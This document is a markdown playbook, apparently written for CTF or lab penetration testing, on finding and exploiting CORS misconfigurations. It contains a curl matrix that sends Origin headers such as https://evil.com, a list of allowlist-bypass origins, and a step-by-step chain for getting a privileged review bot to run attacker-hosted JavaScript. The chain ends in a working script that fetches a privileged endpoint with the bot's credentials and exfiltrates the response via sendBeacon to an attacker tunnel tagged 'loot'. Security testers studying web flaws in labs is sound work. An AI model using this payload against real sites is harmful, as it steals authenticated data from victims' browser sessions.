# CORS misconfiguration

Read this when the app **documents a cross-origin story** (widget/embed/sandbox/"connected
apps"/public API), when any response carries `Access-Control-Allow-Origin`, or when a privileged
route sits behind a session you can't get — with a workflow that makes a privileged browser
visit a page you control.

## The one-command matrix — run it at first API contact

CORS is not something to test late. It is four requests. The **asymmetry between two endpoints
is the finding**, so always compare a privileged route against a boring one:

```bash
for ep in /api/hq/recovery /api/v1/me; do
  for o in "https://apps.sandbox.example" "https://evil.com" "null" ""; do
    echo "--- $ep  Origin: ${o:-<none>}"
    curl -s -D- -o /dev/null --max-time 15 -b cookie.jar "$BASE$ep" \
      ${o:+-H "Origin: $o"} | grep -iE '^(HTTP|access-control|vary)'
  done
done
```

Read the table it prints:

| ACAO behaviour | Verdict |
|---|---|
| echoes whatever you send + `Allow-Credentials: true` | **exploitable** — any origin can read it with the victim's cookies |
| echoes only an allowlisted origin | try suffix/prefix/`null`/scheme tricks below |
| `*` with **no** credentials | not exploitable for authenticated data |
| header absent entirely | not CORS-readable — this is your control endpoint |

**A 401 or 403 does not mean "skip the headers."** On Vaultly-010 the reflected ACAO sat on a
`403 Forbidden` response, and `/api/v1/me` returned `401` with *no* ACAO at all. Reading the
status and moving on hid the whole lab for ten minutes. The CORS headers are the finding
independent of the status code — same rule as `curl -si` for flags in headers.

Also probe the **preflight**, which often answers unauthenticated and reveals the policy before
you have any session at all:

```bash
curl -s -D- -o /dev/null -X OPTIONS "$BASE/api/hq/recovery" \
  -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: GET'
```

## Bypasses when there is an allowlist

Try in this order — cheap, and each is a distinct parser bug:

```
https://target.com.evil.com        suffix append (regex missing anchor)
https://evilтarget.com             prefix/substring match
null                               sandboxed iframe, data:, redirect -> Origin: null
http://target.com                  scheme downgrade, if http is trusted
https://target.com:evil.com        Safari/older parsers
https://sub.target.com             any XSS on any subdomain becomes a CORS read
```

`Vary: Origin` in the response is the tell that the server computes ACAO from your header
rather than serving a constant — i.e. reflection logic exists somewhere.

## CORS grants no privileges — it borrows a browser

This is the part that decides how you spend your time. A reflected ACAO does **not** let *you*
read anything: your own curl already sends your own cookies. It lets **a page you control**
read a response fetched with *someone else's* cookies. So a CORS finding is only a solve when
you also have:

1. a **privileged browser** that will visit your content — an admin/reviewer/support bot, a
   "request a review" workflow, a shared preview link; and
2. a place to **host JS** that browser will load — a sandbox/preview app, stored XSS, or an
   attacker-hosted page if the bot will follow an arbitrary URL.

If the app has (1) and (2) and a route you get `403` on, the chain is almost certainly the lab.
Check what the target endpoint returns to *every* role you can log in as: if all of them are
`403`, the intended reader is the bot, not a role you can escalate into.

## The chain, end to end

```
publish JS to the origin the bot trusts   ->  trigger the review/report workflow
   ->  bot's browser runs your JS with ITS session
   ->  fetch(privileged_url, {credentials:'include'})   [readable: ACAO reflected]
   ->  exfil the body to your collector
```

Stand the collector up **first** — `scripts/oob.py`, ~30s — then write one multi-channel
payload. Details and the payload template: `xss-ssrf.md`.

```html
<script>
fetch("https://api.target/api/hq/recovery", {credentials: "include"})
  .then(r => r.text())
  .then(t => navigator.sendBeacon("https://<tunnel>/sb?tag=loot", t));
</script>
```

Note the fetch must be **cross-origin** for CORS to matter. If your JS is hosted on the same
origin as the API, you have same-origin access already and CORS is irrelevant — check
`location.origin` in the bot (beacon it) before concluding a fetch failure is a CORS block.

## Reading a failure correctly

`TypeError: Failed to fetch` in the bot means the browser **blocked the read** — the request
very likely still reached the server. That is a CORS *negative* for that endpoint, and it is
useful: it is the control that proves your other endpoint's success was really CORS-driven.
Beacon `err.message` for every target so a silent failure is distinguishable from "never ran."
